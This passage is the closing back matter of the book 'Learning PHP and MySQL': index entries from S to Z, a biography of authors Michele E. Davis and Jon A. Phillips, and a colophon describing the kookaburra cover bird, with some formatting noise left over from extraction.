 scope resolution operator (::), 104 
  
 scope, variables, 45 
  
  
 within classes, 99 
  
 search and replace (MySQL database), 
  
  
 REPLACE function, 169
  
  
 WHERE clause, 139 
  
 selects (form input), 206 
  
  
 validating user input from, 210 
  
 serialized session variables, 294 
  
 $_SERVER super global 
  
  
 HTTP_Cookie, 288 
  
  
 trustworthiness of, 319 
  
 servers, interaction with cookies, 285 
  
 server-side processing, 11 
  
 server-side programming language, 4 
  
 $_SESSION global variable, 315 
  
  
 clearing, 299 
  
  
 registering variable by inclusion in, 
 296
  
 406
  
 |
  
 Index",NA
T,"\t (tab character) in regular expressions, 
 332 TABLE.COLUMN, referencing MySQL 
  
  
  
  
 columns, 140 
  
 tables, MySQL database 
  
  
 adding data to, 135 
  
  
 aliases for tables included in a query, 142 
  
 creating, 133 
  
  
 creating from PHP, 263–265 
  
  
 deleting entire table with TRUNCATE 
  
  
  
 TABLE, 277 
  
  
 dropping from PHP, 265 
  
  
 joining, 140 
  
  
 manipulating table definition, 136–138 
  
  
 adding a column, 137 
  
  
  
 changing a column’s database, 136 
  
  
 deleting entire table, 138 
  
  
  
 removing a column, 138 
  
  
  
 renaming a column, 137 
  
  
  
 renaming a table, 136 
  
  
 selecting which to query and which rows 
  
  
  
 to view, 138 
  
  
 updating data, 142 
  
 tags, HTML, 11 
  
  
 elements, 11 
  
 tags, PHP, 368
  
 408
  
 |
  
 Index",NA
U,"UCASE and LCASE functions, 166 
  
 ucwords function, 231 
  
 unary operators, 65 
  
 uncommenting line that loads PHP module 
  
  
  
 (on Mac OS X), 26 
  
 underscore (_) separating multiple words 
 in 
   
  
 variable names, 44 
  
 unions, 6 
  
 UNIQUE command, 160 
  
 unique identifiers 
  
  
 generating, 280 
  
 Unix 
  
  
 accessing MySQL with command 
  
  
  
  
 line, 123 
  
  
 MySQL datafiles directory, 156 
  
  
 PEAR Package Manager, installing, 191 
  
 timestamps, PHP functions for, 233 
 unix_timestamp( ) function, 176 
  
 unlink command, 241 
  
 unnamed views, 6 
  
 UPDATE command, 142 
  
  
 WHERE clause, 142 
  
 updating database data from PHP, 276 
 uploading files, 243–248 
  
  
 accessing the file, 244 
  
  
 move_uploaded_file function, 246 
  
  
 validation, 244–248 
  
  
  
 checking existence of uploaded 
  
  
  
  
 file, 244 
  
  
  
 checking file size, 245 
  
  
  
 checking file type, 245 
  
 URIs 
  
  
 XML namespaces, 254 
  
 URLs 
  
  
 wrappers used with filesystem 
  
  
  
  
 functions, 242 
  
 USE command (MySQL), 125 
  
 user agent, 2 
  
 user data 
  
  
 validating with JavaScript, 325–329 
  
 validating with regular 
  
  
  
  
 expressions, 329–333
  
  
 Index
  
 | 409",NA
V,"validation, 325–329 
  
  
 dates, 235 
  
  
 files for upload, 244 
  
  
 PHP validation failure, redisplaying form 
  
  
  
 after, 333–336 
  
  
 user input with regular 
  
  
  
  
 expressions, 329–333 
  
  
 user input, validating with 
  
  
  
  
 JavaScript, 325–329 
  
  
 XHTML documents, 257–258 
  
 variable poisoning, detecting, 315 
  
 variables, 43–50 
  
  
 assigning objects to, 99 
  
  
 assigning values to, 44 
  
  
  
 new value assigned to existing 
  
  
  
  
 variable, 44 
  
  
 assignment to sessions, 295 
  
  
 casting, 66 
  
  
 in classes, 96 
  
  
 converting types, 65 
  
  
 creating, 44 
  
  
 data types, 45 
  
  
  
 converting to required type, 45 
  
  
 defining in PHP, 43 
  
  
 determining if an array, 110 
  
  
 expressions, 62 
  
  
 extracting from an array, 117–119 
  
  
  
 numeric array, 118 
  
  
  
 preventing overwriting a variable, 
 117 
   
 using compact to build an array 
 from 
   
  
 variables, 118 
  
  
 global, 46 
  
  
 initializing, 316 
  
  
 naming, 43, 369 
  
  
 reading value of, 44 
  
  
 references, 105 
  
  
 scope, 45 
  
  
  
 within classes, 99 
  
  
 security risks of automatic global 
  
  
  
  
 variables, 312–316 
  
  
 serialized, 294 
  
  
 set, 73",NA
W,"\W (nonword character) in regular 
  
  
  
  
 expressions, 332 
  
 \w (word character) in regular 
  
  
  
  
 expressions, 332 
  
 web applications (blog example), 339–364 
 web browsers 
  
  
 compatibility with XHTML, 261 
  
  
 cookies, 285 
  
  
 JavaScript, 325 
  
  
 operating systems and, 7 
  
  
 session IDs, 294 
  
  
 session information about, 317 
  
  
 XHTML and, 253 
  
 web pages 
  
  
 dynamic, 1 
  
  
  
 main components of, 4–7 
  
  
 requesting data from, 11–13 
  
  
  
 PHP interpreter, MySQL and web 
  
  
  
 server cooperating, 13 
  
  
 static, 1 
  
 web server process, 12 
  
 Web Server Setup dialog (for Apache), 23 
 web servers, 2, 4 
  
  
 accessing PHP files through, 37 
  
  
 Apache, 5 
  
  
 IIS (Internet Information Services), 5 
  
 operating system (OS) compatibility, 7 
  
 sessions, 294 
  
  
 shared, security concerns, 319 
  
 web sites, 373 
  
 weblog (see blog) 
  
 WEEKDAY function, 170 
  
 WHERE clause 
  
  
 delete query (blog example), 355 
  
  
 logical operators in, 144 
  
  
 SELECT statement, 138 
  
  
  
 restricting your query, 139 
  
  
 UPDATE command, 142 
  
  
 UPDATE statement, 276 
  
  
 using an index, 160 
  
 while loops, 78 
  
 wildcards 
  
  
 MySQL search functions, 143 
  
  
 search string, 215
  
 410
  
 |
  
 Index",NA
X,"XAMPP 
  
  
 Installation Wizard, 34 
  
 installing, 33–35 
  
 Xdebug, 116 
  
 XForms, 255 
  
 XFrames (XHTML 2.0), 255
  
 XOR (logical NOR) operator, 70 
  
 XOR (logical XOR) operator, 68 
  
 XSS (cross-site scripting), 321",NA
Z,"Zend Framework, 372 
  
 Zend Studio, debugger tool, 116
  
 XHTML, 251–262 
  
 browsers and, 253 
  
 generating with PHP, 261
  
 Index
  
 | 411",NA
About the Authors,"Michele E. Davis
  and
  Jon A. Phillips
  are the Krauts: Krautgrrl and Krautboy, 
 respec-tively. Phillips has a background in computer science, having started 
 programming in grade school. He’s worked with numerous databases, including 
 Oracle, SQL Server, and MySQL. Phillips is always looking for the best technologies, 
 such as PHP, to solve real-world computing problems. He enjoys building 
 computers, trouble-shooting, and designing custom web solutions for the Kraut 
 clients and his three rambunctious children. Davis has been a career writer since 
 grade school and has focused on all forms of technology writing: from marcom to 
 hardware or software user manuals. Davis has written (and coauthored) books for 
 ibooks, Sybex, and Wiley. Her greatest skill is breaking down highly technical 
 concepts into easy-to-digest information bites for her clients and readers. She is the 
 creative edge of Kraut Companies, while Phillips handles the backend coding. Her 
 hobbies are reading, writing, and pretending to be a soccer mom.",NA
Colophon,"The image on the cover of
  Learning PHP and MySQL
  is of kookaburra birds (
 Dacelo
 ). 
 This “laughing” bird is indigenous to the eastern woodland parts of Australia, and it 
 derives its name from its distinctive call. Similar to a loud, howling laugh, it sounds 
 as if the bird is saying “koo koo koo ka ka ka.” It typically makes this call at dawn 
 and again in the early evening to mark its territory. The call is also used as a 
 greeting and can get quite loud if groups of the birds meet each other and begin 
 engaging in “conversations.”
  
 A kookaburra is also easily recognizable by its plumage. It has brown feathers on 
 top and cream-colored feathers on the underside and a large, strong, black beak. 
 There is a brown stripe through the eye area. Its wings are brown, tinged with a 
 light shade of blue, and the tail feathers are black. Males also have a darker shade of 
 blue streaked through their tail feathers. The kookaburra is about 16–17 inches tall. 
 Its diet varies and includes insects, lizards, snakes, and small birds. If the prey is 
 small enough, the kookaburra will snap it up quickly and eat it whole; if it’s large, it 
 kills the prey by dropping it to the ground from a high point or by beating it against 
 a tree, rock, or the ground. Friendly and comfortable around humans, kookaburras 
 have been known to steal unattended BBQ or picnic fare, still choosing to beat it 
 against a tree before eating.
  
 Kookaburras are believed to mate for life. An interesting fact is the offspring stay 
 with the family unit for extended periods, helping to raise the next generations of 
 babies by assisting with such things as egg incubation and feeding.
  
 The cover image is from
  Cassell’s Natural History
 . The cover font is Adobe ITC 
 Garamond. The text font is Linotype Birka; the heading font is Adobe Myriad 
 Condensed; and the code font is LucasFont’s TheSans Mono Condensed.",NA
